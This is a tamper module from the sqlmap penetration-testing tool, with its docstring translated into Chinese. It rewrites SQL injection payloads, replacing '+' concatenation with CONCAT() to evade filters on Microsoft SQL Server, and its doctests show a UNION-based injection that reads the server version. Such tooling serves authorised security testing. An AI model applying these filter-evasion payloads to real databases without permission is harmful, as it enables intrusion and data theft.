#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.common import zeroDepthSearch
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    "\n    将加号运算符 ('+') 替换为 (MsSQL) 函数 CONCAT() 对应项\n\n    测试针对：\n        * 微软 SQL Server 2012\n\n    Requirements:\n        * 微软 SQL Server 2012+\n\n    Notes:\n        * 在 ('+') 字符被过滤的情况下有用\n\n    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')\n    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'\n\n    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')\n    '1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe'\n    "

    retVal = payload

    if payload:
        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
        if match:
            part = match.group(0)

            chars = [char for char in part]
            for index in zeroDepthSearch(part, '+'):
                chars[index] = ','

            replacement = "CONCAT(%s)" % "".join(chars)
            retVal = retVal.replace(part, replacement)

    return retVal
